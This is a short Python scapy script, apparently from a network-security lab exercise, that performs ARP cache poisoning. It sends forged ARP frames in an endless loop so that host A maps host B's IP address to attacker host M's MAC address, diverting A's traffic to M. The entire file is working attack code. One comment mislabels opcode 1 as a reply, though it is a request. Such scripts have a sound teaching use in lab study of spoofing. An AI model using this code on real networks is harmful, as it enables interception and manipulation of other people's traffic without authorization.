#! /usr/bin/env python
# -*- coding: utf-8 -*-
# HostM冒充HostB对HostA发送伪造ARP报文

from scapy.all import *

# Machine A:
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Machine B:
IP_B = "192.168.60.4"
MAC_B = "02:42:c0:a8:3c:04"

# Machine M:
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"

print("SENDING SPOOFED ARP REPLY")

# 欺骗A机器，让它把数据发送到M机器的MAC地址
ether = Ether(dst=MAC_A)
arp = ARP()
arp.psrc = IP_B
arp.hwsrc = MAC_M
arp.pdst = IP_A
arp.op = 1  # ARP REPLY
frame = ether / arp

if __name__ == "__main__":
    while True:
        sendp(frame, verbose=0)

